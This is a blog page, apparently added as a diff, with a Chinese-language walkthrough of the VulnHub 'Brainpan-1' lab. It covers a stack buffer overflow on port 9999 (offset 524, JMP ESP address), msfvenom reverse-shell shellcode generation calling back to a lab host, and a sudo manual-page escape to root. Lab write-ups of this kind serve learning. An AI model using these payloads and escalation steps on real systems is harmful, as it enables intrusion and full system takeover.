@@ -1,0 +1,266 @@
+<!DOCTYPE html><html lang="en" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>Brainpan-1 | Iz0fPriestess</title><meta name="author" content="Creexile"><meta name="copyright" content="Creexile"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="ffffff"><meta name="description" content="No.10">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Brainpan-1">
+<meta property="og:url" content="https://4reexile.github.io/article/Brainpan-1/index.html">
+<meta property="og:site_name" content="Iz0fPriestess">
+<meta property="og:description" content="No.10">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://4reexile.github.io/img/tx.png">
+<meta property="article:published_time" content="2024-10-02T07:38:36.000Z">
+<meta property="article:modified_time" content="2024-10-02T07:41:34.125Z">
+<meta property="article:author" content="Creexile">
+<meta property="article:tag" content="Linux">
+<meta property="article:tag" content="Windows">
+<meta property="article:tag" content="缓冲区溢出">
+<meta property="article:tag" content="sudo提权">
+<meta property="article:tag" content="工具利用">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://4reexile.github.io/img/tx.png"><link rel="shortcut icon" href="/img/prts.ico"><link rel="canonical" href="https://4reexile.github.io/article/Brainpan-1/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//hm.baidu.com"/><link rel="stylesheet" href="/css/index.css?v=4.13.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.5.1/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "https://hm.baidu.com/hm.js?76992a4541699d4a08e36c0eb02f7796";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found"}},
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":400},
+  copy: {
+    success: 'Copy Successful',
+    error: 'Copy Error',
+    noSupport: 'Browser Not Supported'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: 'days',
+  dateSuffix: {
+    just: 'Just now',
+    min: 'minutes ago',
+    hour: 'hours ago',
+    day: 'days ago',
+    month: 'months ago'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.11.1/dist/infinitegrid.min.js',
+    buttonText: 'Load More'
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'Brainpan-1',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2024-10-02 15:41:34'
+}</script><script>(win=>{
+      win.saveToLocal = {
+        set: (key, value, ttl) => {
+          if (ttl === 0) return
+          const now = Date.now()
+          const expiry = now + ttl * 86400000
+          const item = {
+            value,
+            expiry
+          }
+          localStorage.setItem(key, JSON.stringify(item))
+        },
+      
+        get: key => {
+          const itemStr = localStorage.getItem(key)
+      
+          if (!itemStr) {
+            return undefined
+          }
+          const item = JSON.parse(itemStr)
+          const now = Date.now()
+      
+          if (now > item.expiry) {
+            localStorage.removeItem(key)
+            return undefined
+          }
+          return item.value
+        }
+      }
+    
+      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        script.onerror = reject
+        script.onload = script.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          script.onload = script.onreadystatechange = null
+          resolve()
+        }
+
+        Object.keys(attr).forEach(key => {
+          script.setAttribute(key, attr[key])
+        })
+
+        document.head.appendChild(script)
+      })
+    
+      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onerror = reject
+        link.onload = link.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          link.onload = link.onreadystatechange = null
+          resolve()
+        }
+        document.head.appendChild(link)
+      })
+    
+      win.activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', 'ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+        if (t === 'dark') activateDarkMode()
+        else if (t === 'light') activateLightMode()
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+      const detectApple = () => {
+        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+          document.documentElement.classList.add('apple')
+        }
+      }
+      detectApple()
+    })(window)</script><meta name="generator" content="Hexo 7.1.1"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/tx.png" onerror="onerror=null;src='/img/sddd.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">90</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">106</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">11</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa fa-graduation-cap"></i><span> Articles</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></li><li><a class="site-page child" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></li></ul></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> List</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> Music</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/img/bjt.png')"><nav id="nav"><span id="blog-info"><a href="/" title="Iz0fPriestess"><span class="site-name">Iz0fPriestess</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> Search</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa fa-graduation-cap"></i><span> Articles</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></li><li><a class="site-page child" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></li></ul></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> List</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> Music</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">Brainpan-1</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2024-10-02T07:38:36.000Z" title="Created 2024-10-02 15:38:36">2024-10-02</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2024-10-02T07:41:34.125Z" title="Updated 2024-10-02 15:41:34">2024-10-02</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/vulnhub%E9%9D%B6%E5%9C%BA/">vulnhub靶场</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">Word Count:</span><span class="word-count">1.3k</span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1>Brainpan</h1>
+<hr>
+<blockquote>
+<p>来源: <a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/brainpan-1,51/">vulnhub靶场-brainpan: 1</a></p>
+<p>目标: 没说</p>
+<p>提示: 这个靶机和web关系不大, 主要是缓冲区溢出</p>
+<p>妙妙工具: python -c ‘import pty; pty.spawn(“/bin/bash”)’</p>
+</blockquote>
+<h2 id="环境配置"><a class="header-anchor" href="#环境配置">¶</a>环境配置</h2>
+<p>kali: 192.168.56.5</p>
+<p>target: 192.168.56.15</p>
+<h2 id="信息收集"><a class="header-anchor" href="#信息收集">¶</a>信息收集</h2>
+<ul>
+<li>端口: 9999, 10000</li>
+<li>中间件: python 2.7.3(10000)</li>
+<li>目录: /bin(10000)</li>
+<li>系统: linux 2.6.32-3.10</li>
+</ul>
+<p>基本上都是空的或者静态的, 没什么好搜索的</p>
+<p><code>/bin</code>目录下是一个exe文件, 但是系统是Linux?可能是开了windows服务</p>
+<p>将这个文件下载下来, 找个地儿运行, 发现创建了9999端口的服务, 那看来靶机的9999端口就是这个了</p>
+<p>既然只有这个能利用, 那尝试是否有缓冲区溢出</p>
+<p>脚本小子必备: <a target="_blank" rel="noopener" href="https://github.com/jessekurrus/brainpan">https://github.com/jessekurrus/brainpan</a></p>
+<h2 id="getshell"><a class="header-anchor" href="#getshell">¶</a>getshell</h2>
+<p>用什么调试软件都行, 我这里用的ollydbg</p>
+<ol>
+<li>利用脚本批量产生无意义字符测试文件, 看看是否存在溢出</li>
+</ol>
+<p>当脚本出现以下情况, 则说明有缓冲区溢出, 此时运行的程序会报错或闪退</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python2 .\brainfuzzer.py 127.0.0.1 9999</span><br><span class="line"><span class="comment"># 我这里是运行到大概600就停止了</span></span><br><span class="line"><span class="comment"># [+] Connection failed. Make sure IP/port are correct, or check debugger for brainpan.exe crash.</span></span><br></pre></td></tr></table></figure>
+<ol start="2">
+<li>判断溢出点</li>
+</ol>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">locate pattern_create.rb</span><br><span class="line">/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 1000</span><br><span class="line"><span class="comment"># 生成1000位的可以反查的字符(一定要大于溢出的极限), 复制下来然后放法到brainpan1.py运行</span></span><br><span class="line">python2 brainpan1.py 127.0.0.1 9999</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/image-20241002124224436.png" alt="image-20241002124224436"></p>
+<p>我用的ollydbg, 运行脚本会直接报错: “不知如何继续, 因为内存地址35724134不可读. 请尝试更改EIP或忽路程序异常”</p>
+<blockquote>
+<p>EIP(instrutor pointer指令指针), 这个寄存器标记了下一条指令的内存地址, 是进行缓冲区溢出的关键所在</p>
+</blockquote>
+<p>用这个去反差溢出点:</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">locate pattern_off</span><br><span class="line">/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 35724134    <span class="comment"># 反查溢出点</span></span><br><span class="line"><span class="comment"># [*] Exact match at offset 524</span></span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>EIP内的值是35724134，这是ASCII码的值，由于小端显示的原因(逆序)，相当于4Ar5, 可以将上面的指令改为查询4Ar5</p>
+</blockquote>
+<p>可以看到偏移量是524, 也就是发送524+4个字符, 即可覆盖EIP寄存器, EIP寄存器存储的内容就是发送的528个字符中的最后4个字符(EIP寄存器从525开始)</p>
+<p>接下来就是要让EIP指向我们的shellcode; 当发生溢出的情况时, 系统就会自动调用ESP, 这一段内存里面存放的是下一跳的信息, 本意是避免溢出导致计算机崩溃, 而让程序继续进行, 所以我们只需要知道他下一跳的地址以及大小, 然后我们构造相对应的shellcode即可</p>
+<ol start="3">
+<li>获取shellcode空间大小</li>
+</ol>
+<p>shellcode大小通常在300-400字节, 1000肯定是游刃有余; 这个程序用524个A填充EBP, 用B填充EIP, 用C填充ESP</p>
+<p>记得重置程序</p>
+<p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/image-20241002133149882.png" alt="image-20241002133149882"></p>
+<p>右键ESP, 选择&quot;数据中窗口跟随&quot;, 可以轻易找到从005FF910-005FFAE7都是C, 找个计算器算一算, 得到容量为471</p>
+<p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/image-20241002134742643.png" alt="image-20241002134742643"></p>
+<ol start="4">
+<li>查找坏字符</li>
+</ol>
+<p>避免因为使用不支持的字符或使程序中断的字符导致利用失败, 运行brainpan3.py即可, 这里就不演示了</p>
+<ol start="5">
+<li>JMP ESP定位</li>
+</ol>
+<p>想要将程序的执行流程跳转到ESP, 需要找到汇编指令JMP ESP的内存地址, 将这个地址塞进EIP中</p>
+<p>这样运行程序就变成了: EIP-&gt;JMP ESP-&gt;ESP</p>
+<p>用的是ollydbg, 可以直接省去一大堆操作, 直接<code>ctrl+f</code>搜索&quot;jmp esp&quot;</p>
+<p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/image-20241002142122430.png" alt="image-20241002142122430"></p>
+<p>我们要将这个内存地址写到EIP中, 由于小端显示的问题, 需要按照字节倒序的方式填入EIP中即&quot;\xf3\x12\x17\x31&quot;</p>
+<ol start="6">
+<li>在ESP中填入shellcode</li>
+</ol>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows/shell_reverse_tcp LHOST=192.168.56.5 LPORT=6666 -b <span class="string">&quot;\x00&quot;</span> -f c</span><br></pre></td></tr></table></figure>
+<p>自动使用了x86/shikata_ga_nai编码模块</p>
+<p>我的推荐是将<code>-f c</code>改为<code>-f py</code>, 可以直接复制进py</p>
+<p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/image-20241002144030801.png" alt="image-20241002144030801"></p>
+<p>利用msf监听, 运行脚本即可, 回到根目录发现是linux的文件结构, 这个windows还真是linux下的服务之一</p>
+<p>现在重新生成linux的木马:</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msfvenom -p linux/x86/shell/reverse_tcp LPORT=4444 LHOST=192.168.56.5 -b <span class="string">&quot;\x00&quot;</span> -f py</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/image-20241002145412671.png" alt="image-20241002145412671"></p>
+<h2 id="信息收集-v2"><a class="header-anchor" href="#信息收集-v2">¶</a>信息收集</h2>
+<p>10000端口服务由<code>/home/puck/checksrv.sh</code>启动, 9999也是这个文件调用brainpan.exe开启的</p>
+<blockquote>
+<p><code>lsb_release -a</code> 查看发行版本, 不是那么泛用</p>
+</blockquote>
+<ul>
+<li>权限: puck</li>
+<li>发行版本: Ubuntu 12.1.</li>
+<li>内核: Linux brainpan 3.5.0-25-generic #39-Ubuntu SMP Mon Feb 25 19:02:34 UTC 2013 i686 i686 i686 GNU/Linux</li>
+<li>环境: python</li>
+<li>用户: anasi, puck, reynard</li>
+<li>服务: 无</li>
+</ul>
+<p><code>sudo -l</code>发现在<code>/home/anansi/bin/anansi_util</code>有免密运行的root权限</p>
+<h2 id="提权"><a class="header-anchor" href="#提权">¶</a>提权</h2>
+<p>因为不给访问, 就直接用路径了</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo /home/anansi/bin/anansi_util</span><br><span class="line"><span class="comment"># 只有三条命令, 只有manual [command]可以交互</span></span><br></pre></td></tr></table></figure>
+<p>查了一下, 发现可以在manual查看手册的时候执行其他命令</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo /home/anansi/bin/anansi_util manual <span class="built_in">ls</span></span><br><span class="line"><span class="comment"># 不要直接回车</span></span><br><span class="line">!<span class="built_in">whoami</span></span><br><span class="line"><span class="comment"># root</span></span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/image-20241002153326787.png" alt="image-20241002153326787"></p>
+<p>如果从此处创建一个bash, 那就是root权限, 直接抓到flag</p>
+<p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/image-20241002153513690.png" alt="image-20241002153513690"></p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>Author: </span><span class="post-copyright-info"><a href="https://4reexile.github.io">Creexile</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>Link: </span><span class="post-copyright-info"><a href="https://4reexile.github.io/article/Brainpan-1/">https://4reexile.github.io/article/Brainpan-1/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/Linux/">Linux</a><a class="post-meta__tags" href="/tags/Windows/">Windows</a><a class="post-meta__tags" href="/tags/%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/">缓冲区溢出</a><a class="post-meta__tags" href="/tags/sudo%E6%8F%90%E6%9D%83/">sudo提权</a><a class="post-meta__tags" href="/tags/%E5%B7%A5%E5%85%B7%E5%88%A9%E7%94%A8/">工具利用</a></div><div class="post_share"></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/article/ctfshow-webbasic-codeaudit/" title="Web入门_代码审计"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">Previous</div><div class="prev_info">Web入门_代码审计</div></div></a></div><div class="next-post pull-right"><a href="/article/FristiLeaks-1.3/" title="FristiLeaks-1.3"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">Next</div><div class="next_info">FristiLeaks-1.3</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>Related Articles</span></div><div class="relatedPosts-list"><div><a href="/article/how-to-create-backdoor/" title="后门技术"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-06-25</div><div class="title">后门技术</div></div></a></div><div><a href="/article/IMF-1/" title="IMF-1"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-09-27</div><div class="title">IMF-1</div></div></a></div><div><a href="/article/SkyTower-1/" title="SkyTower-1"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-09-29</div><div class="title">SkyTower-1</div></div></a></div><div><a href="/article/intrusion-investigation/" title="入侵排查"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-04-08</div><div class="title">入侵排查</div></div></a></div><div><a href="/article/DerpNStink-1/" title="DerpNStink-1"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-09-26</div><div class="title">DerpNStink-1</div></div></a></div><div><a href="/article/FristiLeaks-1.3/" title="FristiLeaks-1.3"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-10-01</div><div class="title">FristiLeaks-1.3</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/tx.png" onerror="this.onerror=null;this.src='/img/sddd.gif'" alt="avatar"/></div><div class="author-info__name">Creexile</div><div class="author-info__description">Don't walk with waning motive.</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">90</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">106</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">11</div></a></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Contents</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">1.</span> <span class="toc-text">Brainpan</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE"><span class="toc-number">1.1.</span> <span class="toc-text">环境配置</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">1.2.</span> <span class="toc-text">信息收集</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#getshell"><span class="toc-number">1.3.</span> <span class="toc-text">getshell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-v2"><span class="toc-number">1.4.</span> <span class="toc-text">信息收集</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8F%90%E6%9D%83"><span class="toc-number">1.5.</span> <span class="toc-text">提权</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Post</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/article/Kioptrix-1-2/" title="Kioptrix-1.2">Kioptrix-1.2</a><time datetime="2025-07-26T14:40:56.500Z" title="Updated 2025-07-26 22:40:56">2025-07-26</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/article/12855/" title="Python原型链污染">Python原型链污染</a><time datetime="2025-07-26T14:36:57.574Z" title="Updated 2025-07-26 22:36:57">2025-07-26</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/article/xss-labs/" title="xss-labs">xss-labs</a><time datetime="2025-07-26T14:36:12.925Z" title="Updated 2025-07-26 22:36:12">2025-07-26</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/article/xss/" title="XSS">XSS</a><time datetime="2025-07-26T14:35:45.178Z" title="Updated 2025-07-26 22:35:45">2025-07-26</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/article/jarbas-1/" title="jarbas-1">jarbas-1</a><time datetime="2025-07-26T14:13:02.073Z" title="Updated 2025-07-26 22:13:02">2025-07-26</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/article/vulnstack-5/" title="VulnStack-红日5">VulnStack-红日5</a><time datetime="2025-07-26T13:23:05.723Z" title="Updated 2025-07-26 21:23:05">2025-07-26</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2024 - 2025 By Creexile</div><div class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Read Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Toggle Between Light And Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle between Single-column and Double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="Setting"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table Of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back To Top"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=4.13.0"></script><script src="/js/main.js?v=4.13.0"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"></div><script async src="/js/custom.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">Search</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  Loading the Database</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="Search for Posts" type="text"/></div></div><hr/><div id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js?v=4.13.0"></script></div></div></body></html>
